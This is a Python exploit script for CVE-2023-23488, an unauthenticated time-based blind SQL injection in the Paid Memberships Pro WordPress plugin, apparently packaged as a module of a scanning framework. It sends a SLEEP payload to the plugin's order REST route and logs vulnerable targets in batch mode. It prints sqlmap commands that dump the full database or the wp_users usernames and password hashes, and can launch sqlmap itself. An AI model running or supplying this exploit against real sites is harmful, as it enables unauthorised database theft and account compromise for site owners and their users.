#!/usr/bin/env python
# -*- coding: utf-8 -*-
# https://github.com/r3nt0n
#
# Exploit Title: Paid Memberships Pro < 2.9.8 (WordPress Plugin) - Unauthenticated SQL Injection
#
# Exploit Author: r3nt0n
# CVE: CVE-2023-23488
# Date: 2023/01/24
# Vulnerability discovered by Joshua Martinelle
# Vendor Homepage: https://www.paidmembershipspro.com
# Software Link: https://downloads.wordpress.org/plugin/paid-memberships-pro.2.9.7.zip
# Advisory: https://github.com/advisories/GHSA-pppw-hpjp-v2p9
# Version: < 2.9.8
# Tested on: Debian 11 - WordPress 6.1.1 - Paid Memberships Pro 2.9.7
#
# Running this script against a WordPress instance with Paid Membership Pro plugin
# tells you if the target is vulnerable.
# As the SQL injection technique required to exploit it is Time-based blind, instead of
# trying to directly exploit the vuln, it will generate the appropriate sqlmap command
# to dump the whole database (probably very time-consuming) or specific chose data like
# usernames and passwords.
#
# Usage example: python3 CVE-2023-23488.py http://127.0.0.1/wordpress

import requests
import urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
urllib3.disable_warnings()
class Cve_2023_23488:
    def get_request(self,target_url, delay="1"):
        payload = "a' OR (SELECT 1 FROM (SELECT(SLEEP(" + delay + ")))a)-- -"
        data = {'rest_route': '/pmpro/v1/order',
                'code': payload}
        return requests.get(target_url, params=data,headers=self.headers,proxies=self.proxy,verify=self.ssl).elapsed.total_seconds()

    def run(self,target_url):
        try:
            reqtime1 = self.get_request(target_url, "5")
            reqtime2 = self.get_request(target_url, "6")
            if reqtime1 < reqtime2 and reqtime1 > 5:
                OutPrintInfoSuc("WordPress", f"The target is vulnerable {target_url}")
                if not self.batch:
                    OutPrintInfo("WordPress", "You can dump the whole WordPress database with:")
                    OutPrintInfo("WordPress",
                                 f'sqlmap -u "{target_url}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump')
                    OutPrintInfo("WordPress", 'To dump data from specific tables:')
                    OutPrintInfo("WordPress",
                                 f'sqlmap -u "{target_url}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump -T wp_users')
                    OutPrintInfo("WordPress",
                                 'To dump only WordPress usernames and passwords columns (you should check if users table have the default name):')
                    OutPrintInfo("WordPress",
                                 f'sqlmap -u "{target_url}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump -T wp_users -C user_login,user_pass')
                else:
                    with open("./result/wordpress_2023_23488.txt","a") as w:
                        w.write(f"{target_url}\n")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("WordPress", 'The target does not seem vulnerable')
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("WordPress", 'ERROR: Target is unreachable')
            return False

    def main(self,target):
        self.batch = target["batch_work"]
        target_url = target['url'].strip("/ ")
        header = target["header"]
        proxy = target["proxy"]
        self.ssl = target["ssl"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("WordPress",'Paid Memberships Pro < 2.9.8 (WordPress Plugin) - Unauthenticated SQL Injection')

        try:
            if not self.batch:
                OutPrintInfo("WordPress",'Testing if the target is vulnerable...')
            req = requests.get(target_url, timeout=15,headers=self.headers,proxies=self.proxy,verify=self.ssl)
        except Exception:
            if not self.batch:
                OutPrintInfo("WordPress", 'ERROR: Target is unreachable')
            return False
        if self.run(target_url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否调用sqlmap执行检测([b red]y/n[/b red])")
                if choose == "y":
                    import os
                    try:
                        dir = os.getcwd()
                        OutPrintInfo("SqlMap",
                                     f'[b bright_red]Query[/b bright_red]: \n[b magenta]sqlmap -u "{target_url}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --output-dir={dir}/result/ --batch')
                        os.system(
                            f"sqlmap -u \"{target_url}/?rest_route=/pmpro/v1/order&code=a\" -p code --skip-heuristics --technique=T --dbms=mysql --output-dir={dir}/result/ --batch")
                    except Exception as e:
                        OutPrintInfoErr(e)



